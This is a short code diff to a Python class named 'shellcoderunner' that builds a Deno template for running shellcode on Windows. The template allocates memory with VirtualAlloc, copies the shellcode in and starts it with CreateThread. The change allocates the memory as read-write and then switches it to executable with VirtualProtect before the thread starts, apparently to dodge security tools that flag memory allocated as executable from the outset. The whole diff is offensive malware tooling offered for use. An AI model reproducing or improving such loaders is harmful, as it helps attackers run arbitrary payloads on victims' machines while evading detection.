@@ -15,10 +15,13 @@ class shellcoderunner:
         return """
     {transformers}
 
-    const address = {VirtualAlloc}(null, {shellcodeSize}, 0x3000, 0x40);
+    const address = {VirtualAlloc}(null, {shellcodeSize}, 0x3000, 0x4);
     const view = Deno.UnsafePointerView.getArrayBuffer(address, {shellcodeSize});
     const destView = new Uint8Array(view);
     destView.set(shellcode);
+
+    const oldProtect = new Uint8Array(4);
+    {VirtualProtect}(address, {shellcodeSize}, 0x40, oldProtect)
 
     const threadIdBuffer = new Uint32Array(1);
     const hThread = {CreateThread}(null, 0, address, null, 0, null);
@@ -26,7 +29,7 @@ class shellcoderunner:
         parameters: [],
         result: "void", // Adjust if your code returns a value (e.g., "i32")
     }});
-        
+
     fn.call()        
     {WaitForSingleObject}(hThread, 0xFFFFFFFF);
 
